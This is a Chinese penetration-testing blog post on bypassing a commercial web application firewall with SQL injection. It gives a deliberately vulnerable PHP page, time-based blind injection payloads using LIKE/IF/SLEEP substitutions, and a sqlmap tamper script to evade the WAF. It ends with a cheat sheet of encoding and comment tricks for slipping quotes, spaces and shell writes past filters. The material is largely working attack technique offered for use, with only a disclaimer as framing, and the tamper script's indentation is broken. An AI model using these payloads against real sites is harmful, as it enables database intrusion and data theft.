<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>渗透测试中的Bypass技巧（四）自动化注入 « 倾旋的博客</title>
  <meta name="description" content="声明：本文旨在技术研究，请勿用于违法用途，否则后果自负。">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/archivers/2017-03-10/2">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
<script>MathJax={"tex":{"inlineMath":[["$","$"],["\\(","\\)"]],"displayMath":[["$$","$$"],["\\[","\\]"]]},"svg":{"fontCache":"global"},"svg":{"fontCache":"global"}}</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="post">

  <header class="post-header">
    <h1 class="post-title">渗透测试中的Bypass技巧（四）自动化注入</h1>
    <p class="post-meta">Mar 13, 2017</p>
  </header>

  <article class="post-content">
    <p>声明：本文旨在技术研究，请勿用于违法用途，否则后果自负。
<!--more--></p>

<ul id="markdown-toc">
  <li><a href="#0x01-%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95" id="markdown-toc-0x01-简单测试">0x01 简单测试</a></li>
  <li><a href="#0x02-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5" id="markdown-toc-0x02-继续深入">0x02 继续深入</a></li>
  <li><a href="#0x03-%E8%87%AA%E5%8A%A8%E5%8C%96bypass%E6%89%A9%E5%B1%95" id="markdown-toc-0x03-自动化bypass扩展">0x03 自动化Bypass（扩展）</a></li>
  <li><a href="#0x04-%E5%B0%8F%E6%80%BB%E7%BB%93" id="markdown-toc-0x04-小总结">0x04 小总结</a></li>
</ul>

<h2 id="0x01-简单测试">0x01 简单测试</h2>

<p>列举一下常见的WAF：</p>

<ul>
  <li>安全狗</li>
  <li>云锁</li>
  <li>护卫神</li>
  <li>D盾</li>
  <li>360网站卫士</li>
  <li>百度云加速</li>
  <li>阿里云云盾</li>
</ul>

<p>环境：</p>

<ul>
  <li>WAF：某锁最新版本3.1.6</li>
  <li>系统:windows 2003</li>
  <li>WEB服务器：apache2.4.23</li>
  <li>Php版本：php5.4.45</li>
  <li>Mysql：5.5.53</li>
</ul>

<p>PHP SQL注入页面代码：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">'127.0.0.1'</span><span class="p">,</span><span class="s1">'root'</span><span class="p">,</span><span class="s1">'root'</span><span class="p">)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">'Mysql Cannot Connect'</span><span class="p">);</span>

<span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">'qq'</span><span class="p">);</span>
<span class="nv">$id</span> <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span><span class="o">?</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>

<span class="nv">$sql</span><span class="o">=</span><span class="s2">"select * from qq where id = "</span><span class="mf">.</span><span class="nv">$id</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$sql</span><span class="mf">.</span><span class="s1">'&lt;hr&gt;'</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)){</span>
    
     <span class="k">exit</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">(</span><span class="nv">$link</span><span class="p">));</span>
<span class="p">}</span>
<span class="nv">$data</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
     
<span class="k">echo</span> <span class="s1">'ID   = '</span><span class="mf">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="mf">.</span><span class="s1">'&lt;br&gt;'</span><span class="p">;</span>
<span class="k">echo</span> <span class="s1">'NAME = '</span><span class="mf">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span><span class="mf">.</span><span class="s1">'&lt;br&gt;'</span><span class="p">;</span>
     
<span class="k">echo</span> <span class="s1">'AGE  = '</span><span class="mf">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'age'</span><span class="p">]</span><span class="mf">.</span><span class="s1">'&lt;br&gt;'</span><span class="p">;</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>从上方代码可以看到ID并没有做过滤</p>

<p>那我们现在测试一下注入点是否可以注入到数据</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-57949f3be7b36231e4cbf97b64c248e5_hd.jpg" alt="enter description here"></p>

<p>现在我们开启某锁漏洞防护功能</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-6524ea0d47689fe7ce2c91adc029ce83_hd.jpg" alt="enter description here"></p>

<p>下面我们开始研究bypass的方法</p>

<p>我们会根据以下几个知识点</p>

<ul>
  <li>等价替换</li>
  <li>大小写替换</li>
  <li>不常用条件</li>
  <li>特殊符号</li>
  <li>编码</li>
  <li>注释</li>
</ul>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-4dc163efde9478ea043ccca478b3cfc6_hd.jpg" alt="enter description here"></p>

<p>从上面图片数据可看到 某锁防护已经拦截了我这条语句</p>

<p>我们先测试简单的布尔值运算</p>

<ul>
  <li>And 1=1 被拦截</li>
  <li>and ‘1’=’1’ 被拦截</li>
  <li>and “1”=”1” 被拦截</li>
  <li>and ‘1’=1 被拦截</li>
  <li>and ‘1’ 不拦截</li>
</ul>

<p>意味着 某锁检测到有=符号 才给拦截的 如何绕过呢</p>

<p>这里我们要涉及到一个知识点</p>

<p>等价替换符号:</p>

<p>&lt; &gt; 等价于 BETWEEN</p>

<p>= 等价于 like</p>

<p>据我所知只有那么多 还有知道的多多提供</p>

<p>那我们可以把“=”替换成 like</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-7f4d0d86a42821faca2d74d07d04b95c_r.jpg" alt="enter description here"></p>

<p>从上图可看到简单布尔值运算完全绕过某锁了</p>

<p>那我们继续获取数据吧</p>

<h2 id="0x02-继续深入">0x02 继续深入</h2>

<p>尝试了 联合查询注入 报错注入试了一遍还是不行</p>

<p>倾旋曾挖掘过一个x全狗的盲注</p>

<p>这时倾旋提出试试盲注呗</p>

<p>二话不说 上去就是干盲注</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-7f329510c8aaaf19a6616c94d82c80f6_r.jpg" alt="enter description here"></p>

<p>id=1 and ‘1’ like IF(1 LiKe 1,1,2)</p>

<p>上方信息可看出使用了大小写替换而且通过if做了一次判断</p>

<p>If()函数：if(条件,如果真返回的值,如果假返回的值)</p>

<p>那我们继续往下</p>

<p>这时我们要讲一下等价函数</p>

<p>Hex() bin() 等价于 ascii()</p>

<p>Sleep() 等价于 benchmark()</p>

<p>Mid()substring() 等价于 substr()</p>

<p>@@user 等价于 User()</p>

<p>@@Version 等价于 version()</p>

<p>根据这些函数我们先来获取mysql root 用户的第一个首字母吧</p>

<p>基于时间的盲注测试</p>

<p>我的mysql是默认账号密码也就是第一个首字母是r</p>

<p>我们查一查r的ASCII码为114</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-cda4c871c85ff5ce00c8e4202e75145a_r.jpg" alt="enter description here"></p>

<p>现在我们构造语句：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
And '1' like IF(ascii(substr(user(),1,1)) LiKe 113,1,sleep(5))
</code></pre></div></div>

<p>这段语句简单解释下，大牛直接跳过。</p>

<p>Substr()截取user()用户名第一位 为r</p>

<p>Ascii(‘r’) 将r 转换成ascii码</p>

<p>If()判断114 Like(=) 113 如果等于值为1如果不等于Sleep(延时)5秒</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-00c3aaf6fb40aa18c13bd0fd56d995d6_hd.jpg" alt="enter description here"></p>

<p>可看到数据没有查出来 页面延时了5秒才加载出来</p>

<p>最后答案 114不等于113</p>

<p>剩下盲注出你想要的数据就要慢慢去测试了</p>

<p>最终Payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>and '1' like if(ascii(substr(user(),1,1)) like 113,1,sleep(5))

</code></pre></div></div>

<p>能遇到某锁不拦截这些函数感觉也挺奇怪的</p>

<p>下面讲一下如果拦截我们应该使用什么方法绕过呢</p>

<p>这里只提供知识点没有实战</p>

<h2 id="0x03-自动化bypass扩展">0x03 自动化Bypass（扩展）</h2>

<p>这里扩充一下编写tamper bypass脚本</p>

<p>先直接使用SQLmap进行测试（毋庸置疑，肯定失败）：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-faac6760d2f122435e4f160d2e53ad64_hd.jpg" alt="enter description here"></p>

<p>在经过大量测试以后，我们定位特征，写出了bypass脚本：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span><span class="kn">import</span> <span class="nn">re</span>
<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="p">.</span><span class="n">LOW</span>
<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
              <span class="k">pass</span>
              <span class="n">payload</span> <span class="o">=</span>
<span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"SLEEP(5)"</span><span class="p">,</span><span class="s">"</span><span class="se">\"</span><span class="s">0</span><span class="se">\"</span><span class="s"> LikE Sleep(5)"</span><span class="p">)</span>
       <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">""</span><span class="p">,</span><span class="s">"/*FFFFFFFFFFFFFFFFFFFFFFFFF*/"</span><span class="p">)</span>
              <span class="n">p</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="sa">r</span><span class="s">'(\d+)='</span><span class="p">)</span>
              <span class="n">payload</span><span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s">"''LikE "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="k">return</span> <span class="n">payload</span>
</code></pre></div></div>
<p>测试结果：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-4e0f4750e89249adf297fa0ce8e9d831_hd.jpg" alt="enter description here"></p>

<h2 id="0x04-小总结">0x04 小总结</h2>

<p>等价替换</p>

<p>前面已经讲解了 等价函数和等价符号</p>

<p>大小写替换 想必这个大家应该都知道 把字母的大写小写替换下就行了例如 SeLeCt LiKe UnIoN</p>

<p>不常用函数
一般经常在报错注入中使用</p>

<p>例如floor(),extractvalue(),updatexml(),exp() 这些 原因是因为waf 可能没考虑到这些函数的危害</p>

<p>特殊符号</p>

<p>例如 <code class="language-plaintext highlighter-rouge">“+”,“-”,“@”,“！”,“~”</code>等等很多的特殊符号</p>

<p>比如 “+” select+password+from+mysql.user 相当于是一个空格的作用</p>

<p>编码
URL编码</p>

<p>普通的URL编码就不再过多叙述，但是在有些数据传输过程中可以采用双重URL编码测试</p>

<p>Unicode编码</p>

<p>个别特殊符号：</p>

<p>单引号：</p>

<p>%u0027、%u02b9、%u02bc%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
空格：</p>

<p>%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p>

<p>左括号：</p>

<p>%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p>

<p>右括号：</p>

<p>%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p>

<p>十六进制编码</p>

<p>在有的情况下通过注入点写shell的时候，我们一般把shell code转换为十六进制，其一因为数据库自动转换，其二是因为可以逃避WAF针对特殊字符拦截。</p>

<p>注释</p>

<p>某些情况下，针对不同的数据库采用不同的注释混淆，也可以bypass</p>

<p>普通注释 <code class="language-plaintext highlighter-rouge">/**/、-- 、# ...</code></p>

<p>内联注释 <code class="language-plaintext highlighter-rouge">/*!*/</code></p>


  </article>
  
  




</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
